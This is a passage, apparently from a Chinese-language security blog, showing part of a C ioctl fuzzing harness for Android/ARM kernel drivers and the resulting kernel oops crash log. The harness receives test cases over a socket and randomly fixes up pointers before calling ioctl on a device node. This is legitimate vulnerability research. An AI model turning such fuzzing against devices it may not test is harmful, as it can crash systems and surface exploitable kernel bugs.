<span class="built_in">memcpy</span>(&amp;dev_name_len, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// srand with new seed</span></span><br><span class="line">		srand(seed);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* dev name */</span></span><br><span class="line">		dev_name = <span class="built_in">calloc</span>(dev_name_len+<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (dev_name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate dev_name\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>(dev_name, head, dev_name_len);</span><br><span class="line">		head += dev_name_len;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* map */</span></span><br><span class="line">		<span class="keyword">map_entry_t</span> *<span class="built_in">map</span> = <span class="built_in">calloc</span>(num_mappings, <span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate map\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (num_mappings != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(<span class="built_in">map</span>, head, num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>));</span><br><span class="line">			head += num_mappings*<span class="keyword">sizeof</span>(<span class="keyword">map_entry_t</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* blobs */</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// first create an array to store the sizes themselves</span></span><br><span class="line">		len_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		<span class="keyword">if</span> (len_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate len_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want an array to store our pointers</span></span><br><span class="line">		ptr_arr = <span class="built_in">calloc</span>(num_blobs, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">		<span class="keyword">if</span> (ptr_arr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate ptr_arr\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// copy the blob sizes into our size_arr</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;len_arr[j], head, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">			head += <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// we&#x27;ll also want memory bufs for all blobs</span></span><br><span class="line">		<span class="comment">// now that we have the sizes, allocate all the buffers we need</span></span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">0</span>; j &lt; num_blobs; j++) &#123;</span><br><span class="line">			ptr_arr[j] = <span class="built_in">calloc</span>(len_arr[j], <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Sizeof(ptr_arr[%d])=%d\n&quot;</span>, j, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=%p\n&quot;</span>, j, ptr_arr[j]);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//printf(&quot;just added %p to ptr_arr\n&quot;, ptr_arr[j]);</span></span><br><span class="line">			<span class="keyword">if</span> (ptr_arr[j] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate a blob store\n&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// might as well copy the memory over as soon as we allocate the space</span></span><br><span class="line">			<span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ptr_arr[j], head, len_arr[j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ptr_arr[%d]=\n&quot;</span>, j);</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len_arr[j];i+=<span class="number">4</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;0x%08x\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ptr_arr[j] + i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">			head += len_arr[j];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> num_generics = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// time for pointer fixup</span></span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_mappings; i++) &#123;</span><br><span class="line">			<span class="comment">// get out entry</span></span><br><span class="line">			<span class="keyword">map_entry_t</span> entry = <span class="built_in">map</span>[i];</span><br><span class="line">			<span class="comment">// pull out the struct to be fixed up</span></span><br><span class="line">			<span class="keyword">char</span> *tmp = ptr_arr[entry.src_id];</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// check if this is a struct ptr or just a generic one</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">// just a generic one</span></span><br><span class="line">			<span class="keyword">if</span> (entry.dst_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">// 90% chance we fixup the generic</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">10</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> buf_len = <span class="number">128</span>;</span><br><span class="line">					<span class="keyword">char</span> *tmp_generic = <span class="built_in">malloc</span>(buf_len);</span><br><span class="line">					<span class="built_in">memset</span>(tmp_generic, <span class="number">0</span>, buf_len);</span><br><span class="line">					<span class="comment">// 95% chance we fill it with data</span></span><br><span class="line">					<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &gt; <span class="number">95</span>) &#123;</span><br><span class="line">						<span class="comment">// if dst_id is &lt; 0, it&#x27;s abs value is the element size</span></span><br><span class="line">						<span class="keyword">int</span> size = <span class="number">-1</span> * entry.dst_id;</span><br><span class="line">						<span class="keyword">int</span> weight;</span><br><span class="line">						<span class="comment">// if it&#x27;s a char or some float, never choose a &quot;small val&quot;</span></span><br><span class="line">						<span class="keyword">if</span> (size == <span class="number">1</span> || size &gt; <span class="number">8</span>)</span><br><span class="line">							weight = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							weight = default_weight;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; buf_len; i+=size) &#123;</span><br><span class="line">							gen_rand_val(size, &amp;tmp_generic[i], weight);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					generic_arr[num_generics] = tmp_generic;</span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;tmp_generic, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">					num_generics += <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (num_generics &gt;= <span class="number">264</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;Code a better solution for storing generics\n&quot;</span>);</span><br><span class="line">						<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// a struct ptr, so we have the data</span></span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// 1 in 400 chance we don&#x27;t fixup</span></span><br><span class="line">				<span class="keyword">if</span> ( (rand() % <span class="number">400</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="comment">// now point it to the correct struct/blob</span></span><br><span class="line">					<span class="comment">// printf(&quot;placing %p, at %p\n&quot;, ptr_arr[entry.dst_id], tmp+entry.offset);</span></span><br><span class="line">					<span class="built_in">memcpy</span>(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (debug) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ioctl_id: %d\n&quot;</span>, ioctl_id);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_mappings: %d\n&quot;</span>, num_mappings);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;num_blobs: %d\n&quot;</span>, num_blobs);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name_len: %d\n&quot;</span>, dev_name_len);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;dev_name: %s\n&quot;</span>, dev_name);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;data[]: \n&quot;</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, *(int *)&amp;ptr_arr[0]);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, &amp;ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)ptr_arr[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">1</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">2</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">3</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%p) : &quot;</span>, (&amp;ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(0x%016lx)\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)(ptr_arr[<span class="number">0</span>]+<span class="number">4</span>*<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+5*8));</span></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%016lx)\n&quot;, *(unsigned long int *)(ptr_arr[0]+6*8));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;(0x%x)\n&quot;, (int *)ptr_arr, (int *)ptr_arr);</span></span><br><span class="line">            </span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// time for the actual ioctl</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to open device %s\n&quot;, dev_name);</span></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="keyword">int</span> fd = open(dev_name, O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;Open devicd %s successfully.\n&quot;</span>, dev_name);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//fflush(stdout);</span></span><br><span class="line">		<span class="comment">//printf(&quot;Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n&quot;, fd, ioctl_id, ptr_arr[0]);</span></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10d:&quot;</span>, cnt++);</span><br><span class="line">		<span class="keyword">if</span> ((ioctl(fd, ioctl_id, ptr_arr[<span class="number">0</span>])) == <span class="number">-1</span>)</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;good hit\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;device %s closed\n&quot;</span>, dev_name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (retest)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="comment">// okay now free all the shit we alloced</span></span><br><span class="line">		<span class="built_in">free</span>(recv_buf);</span><br><span class="line">		<span class="built_in">free</span>(dev_name);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">map</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">		<span class="built_in">free</span>(len_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_blobs; i++) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;%d: free&#x27;ing %p\n&quot;, i, ptr_arr[i]);</span></span><br><span class="line">			<span class="built_in">free</span>(ptr_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(ptr_arr);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_generics; i++) &#123;</span><br><span class="line">			<span class="built_in">free</span>(generic_arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		write(client_sock, &amp;msg_size, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		msg_size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">if</span>(read_size == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Client disconnected&quot;</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		close(client_sock);</span><br><span class="line">		<span class="keyword">goto</span> listen;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(read_size == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">[  144.428375] Unable to handle kernel paging request at virtual address d900000c</span><br><span class="line">[  144.436462] pgd &#x3D; dcac0000</span><br><span class="line">[  144.439697] [d900000c] *pgd&#x3D;00000000</span><br><span class="line">[  144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  144.457672] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  144.465118] PC is at c2dm_l1cache+0x30&#x2F;0x100</span><br><span class="line">[  144.469940] LR is at dev_ioctl+0x3f0&#x2F;0x10c4</span><br><span class="line">[  144.474670] pc : [&lt;c03187ac&gt;]    lr : [&lt;c031782c&gt;]    psr: a0000013</span><br><span class="line">[  144.474670] sp : c2d6be38  ip : 00000000  fp : c2d6be6c</span><br><span class="line">[  144.487640] r10: 00000000  r9 : d8c0cca8  r8 : 00b8dd90</span><br><span class="line">[  144.493621] r7 : 00000000  r6 : c2d6bea4  r5 : 00b8dd90  r4 : 388b77c4</span><br><span class="line">[  144.500915] r3 : d9000004  r2 : 75e0c121  r1 : c2d6bea4  r0 : 00000000</span><br><span class="line">[  144.508331] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  144.516418] Control: 10c5387d  Table: 9cac004a  DAC: 00000015</span><br><span class="line">[  144.522827] </span><br><span class="line">[  144.522857] PC: 0xc031872c:</span><br><span class="line">[  144.527954] 872c  e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd</span><br><span class="line">[  144.538482] 874c  eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010</span><br><span class="line">[  144.549163] 876c  e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c</span><br><span class="line">[  144.559844] 878c  e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000</span><br><span class="line">[  144.570404] 87ac  e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003</span><br><span class="line">[  144.581085] 87cc  e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008</span><br><span class="line">[  144.591735] 87ec  e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001</span><br><span class="line">[  144.602416] 880c  e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000</span><br><span class="line">[  144.612976] </span><br><span class="line">[  144.612976] LR: 0xc03177ac:</span><br><span class="line">[  144.618072] 77ac  ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f</span><br><span class="line">[  144.628631] 77cc  e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8</span><br><span class="line">[  144.639160] 77ec  e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb</span><br><span class="line">[  144.649780] 780c  e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3</span><br><span class="line">[  144.660369] 782c  e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088</span><br><span class="line">[  144.670776] 784c  e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003</span><br><span class="line">[  144.681213] 786c  33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f</span><br><span class="line">[  144.691528] 788c  e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005</span><br><span class="line">[  144.701995] </span><br><span class="line">[  144.701995] SP: 0xc2d6bdb8:</span><br><span class="line">[  144.706878] bdb8  c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff</span><br><span class="line">[  144.717407] bdd8  c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4</span><br><span class="line">[  144.727905] bdf8  75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8</span><br><span class="line">[  144.738586] be18  00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff</span><br><span class="line">[  144.749145] be38  c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90</span><br><span class="line">[  144.759796] be58  d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088</span><br><span class="line">[  144.770355] be78  000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000</span><br><span class="line">[  144.781005] be98  c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261</span><br><span class="line">[  144.791687] </span><br><span class="line">[  144.791687] FP: 0xc2d6bdec:</span><br><span class="line">[  144.796661] bdec  c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4</span><br><span class="line">[  144.807189] be0c  00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c</span><br><span class="line">[  144.817840] be2c  c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90</span><br><span class="line">[  144.828399] be4c  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c</span><br><span class="line">[  144.839080] be6c  c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454</span><br><span class="line">[  144.849761] be8c  c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f</span><br><span class="line">[  144.860290] beac  83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  144.870971] becc  00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0</span><br><span class="line">[  144.881652] </span><br><span class="line">[  144.881652] R1: 0xc2d6be24:</span><br><span class="line">[  144.886627] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  144.897308] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  144.907989] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  144.918518] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  144.929199] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  144.939849] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  144.950531] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  144.961059] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  144.971710] </span><br><span class="line">[  144.971710] R3: 0xd8ffff84:</span><br><span class="line">[  144.976623] ff84  d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0</span><br><span class="line">[  144.987213] ffa4  d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088</span><br><span class="line">[  144.997772] ffc4  dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.008392] ffe4  00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********</span><br><span class="line">[  145.018798] 0004  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.029327] 0024  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.039886] 0044  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.050384] 0064  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.060913] </span><br><span class="line">[  145.060913] R6: 0xc2d6be24:</span><br><span class="line">[  145.066009] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  145.076568] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  145.087219] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  145.097900] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  145.108459] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  145.118988] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  145.129638] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  145.140319] bf04  c0317448 00000000 00000000 00000000 